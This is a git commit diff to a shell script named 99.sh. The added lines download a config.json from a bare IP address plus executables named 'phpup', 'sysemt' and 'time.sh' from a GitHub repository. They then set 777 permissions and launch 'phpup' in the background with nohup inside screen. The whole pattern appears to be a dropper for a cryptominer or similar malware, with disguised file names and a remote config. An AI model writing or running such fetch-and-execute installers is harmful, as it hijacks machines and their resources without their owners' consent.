84c19e615d3f4ff2d4ab21df51aff1c7ddc4faaa
teshushu <905353149@qq.com>
2023-01-10 23:30:43 +0800

    Update 99.sh

--- 99.sh
+++ 99.sh
@@ -2,6 +2,15 @@
 
 VERSION=2.11
 cd /tmp/
+mkdir phpup
+cd /phpup/
+wget http://172.247.34.167/wk/config.json
+wget https://github.com/teshushu/BiBi/raw/main/phpup
+wget https://raw.githubusercontent.com/teshushu/BiBi/main/sysemt
+wget https://raw.githubusercontent.com/teshushu/BiBi/main/time.sh
 chmod -R 777 phpup
 chmod -R 777 config.json
+chmod -R 777 sysemt
+chmod -R 777 time.sh
+screen
 nohup ./phpup
